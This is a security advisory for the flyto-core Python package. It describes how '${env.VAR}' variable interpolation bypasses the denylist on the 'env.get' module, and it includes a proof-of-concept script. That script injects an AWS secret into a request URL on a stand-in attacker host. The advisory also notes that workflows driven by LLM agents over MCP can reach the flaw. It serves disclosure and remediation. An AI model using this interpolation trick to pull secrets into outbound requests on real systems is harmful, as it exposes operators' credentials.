# [H] Flyto2 Core: ${env.VAR} interpolation reads any env secret despite env.get being denylisted

## Summary
Severity: High
Advisory: GHSA-hr7p-wg7r-hg9m
CVE: CVE-2026-67427
CWE: CWE-522, CWE-668, CWE-693
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N (CVSS_V3)
Published: 2026-07-30
Source: https://github.com/advisories/GHSA-hr7p-wg7r-hg9m
Type: github-advisory

## Affected
- PyPI: `flyto-core` — affected >=0 <2.26.7

## Details
## Summary

The capability policy denies the `env.get` and `env.load_dotenv` modules by default, with the stated reason that they read arbitrary host environment variables (API keys, DSNs) and are a secret-exfil risk. But the workflow engine's variable resolver expands `${env.VAR}` for any environment variable with no allowlist and no policy check, so the exact capability the denylist blocks is available to any workflow parameter. The resolved secret can then be sent out through any allowed module.

## Affected code

`src/core/engine/variable_resolver.py`:

```python
if var_type == 'env':
    if len(parts) < 2:
        return None
    env_var = parts[1]
    return os.getenv(env_var)      # any env var, no allowlist, not covered by module policy
```

The module policy (`enforce_module_policy` in `module_policy.py`) gates module execution at `BaseModule.run`, but `${...}` interpolation happens earlier in the engine and is not subject to it. So denylisting `env.get` does not actually stop a workflow from reading host env secrets.

## Reproduction

Save as `envbypass_poc.py`, run with `PYTHONPATH=src/src python envbypass_poc.py`.

```python
#!/usr/bin/env python3
import os
os.environ["AWS_SECRET_ACCESS_KEY"] = "AKIA-operator-super-secret-DO-NOT-LEAK"

from core.module_policy import module_filter
from core.engine.variable_resolver import VariableResolver

print("env.get allowed?       ", module_filter.is_allowed("env.get"))
r = VariableResolver(params={}, context={})
print("resolve ${env.SECRET}: ", r.resolve("${env.AWS_SECRET_ACCESS_KEY}"))
print("into an attacker URL:  ", r.resolve("https://attacker.example/collect?k=${env.AWS_SECRET_ACCESS_KEY}"))
```

Output:

```
env.get allowed?        False
resolve ${env.SECRET}:  AKIA-operator-super-secret-DO-NOT-LEAK
into an attacker URL:   https://attacker.example/collect?k=AKIA-operator-super-secret-DO-NOT-LEAK
```

`env.get` is denied, yet `${env.AWS_SECRET_ACCESS_KEY}` reads the same secret and drops it straight into a URL. Confirmed through the running API too: a `POST /v1/workflow/run` step with `text: "${env.AWS_SECRET_ACCESS_KEY}"` resolved to the secret and returned it in the workflow result (in plaintext — the trace redaction did not mask it).

## Reachability (why this is not operator self-service)

The vendor denies `env.get` by default and states the reason inline — reading arbitrary host env vars is a secret-exfil risk. That default only makes sense against an untrusted workflow/agent, which is precisely the caller here: workflow parameters and step values come from the LLM through the MCP tool surface or from a hosted-API client, not from the trusted operator. `${env.*}` gives that same denied capability with no gate, so it is a direct bypass of a control the vendor deliberately turned on — not intended behavior.

## Impact

Read any host environment variable — cloud keys, tokens, DSNs — that the operator relied on the `env.get` denylist to protect, and exfiltrate it by interpolating it into an outbound request handled by an allowed module (the SSRF guard allows the attacker's public host). Reachable via the workflow API and the MCP agent surface.

## Suggested fix

Apply the same policy to `${env.*}` as to the `env.get` module: gate it behind an explicit allowlist of permitted variable names and deny by default when `env.get` is denied, so engine interpolation and module execution enforce one env-access policy. Alternatively drop `${env.*}` and require env values to be passed in explicitly at workflow start.

## References
- https://github.com/flytohub/flyto-core/security/advisories/GHSA-hr7p-wg7r-hg9m
- https://nvd.nist.gov/vuln/detail/CVE-2026-67427
- https://github.com/flytohub/flyto-core/commit/d5f89d71303e3c1e6418d347c5c55fcd173cc8cc
- https://github.com/flytohub/flyto-core
- https://github.com/flytohub/flyto-core/releases/tag/v2.26.6
